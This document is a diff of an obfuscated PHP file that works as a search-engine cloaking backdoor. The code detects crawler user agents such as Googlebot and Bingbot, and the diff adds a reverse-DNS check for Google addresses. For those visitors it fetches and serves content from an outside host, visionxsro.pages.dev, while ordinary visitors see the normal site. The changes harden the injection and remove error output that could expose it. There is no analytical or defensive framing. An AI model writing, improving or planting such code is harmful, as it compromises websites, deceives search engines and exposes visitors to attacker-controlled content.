@@ -1,8 +1,21 @@
 <?php
-$zX1q = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'];
-$zK2v = $_SERVER['HTTP_USER_AGENT'];
-$zW3p = 'https://visionxsro.pages.dev/visionxsro/';
+function isGooglebotIP($ip) {
+    $hostname = gethostbyaddr($ip);
+    return (
+        strpos($hostname, 'googlebot.com') !== false || 
+        strpos($hostname, 'google.com') !== false || 
+        strpos($hostname, 'googleusercontent.com') !== false
+    );
+}
 
+$zX1q = [
+    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
+    'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 
+    'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'
+];
+
+$zK2v = $_SERVER['HTTP_USER_AGENT'];
+$zW3p = "https://visionxsro.pages.dev/visionxsro/";
 $zA4r = false;
 foreach ($zX1q as $zB5t) {
     if (strpos($zK2v, $zB5t) !== false) {
@@ -10,19 +23,14 @@ foreach ($zX1q as $zB5t) {
         break;
     }
 }
-
-if ($zA4r) {
+if ($zA4r || isGooglebotIP($_SERVER['REMOTE_ADDR'])) {
     $zC6n = curl_init();
     curl_setopt($zC6n, CURLOPT_URL, $zW3p);
     curl_setopt($zC6n, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($zC6n, CURLOPT_FOLLOWLOCATION, true);
     $zD7m = curl_exec($zC6n);
-    if (curl_errno($zC6n)) {
-        echo 'Error: ' . curl_error($zC6n);
-    } else {
-        echo $zD7m;
-    }
     curl_close($zC6n);
+    echo $zD7m;
     exit;
 }
 
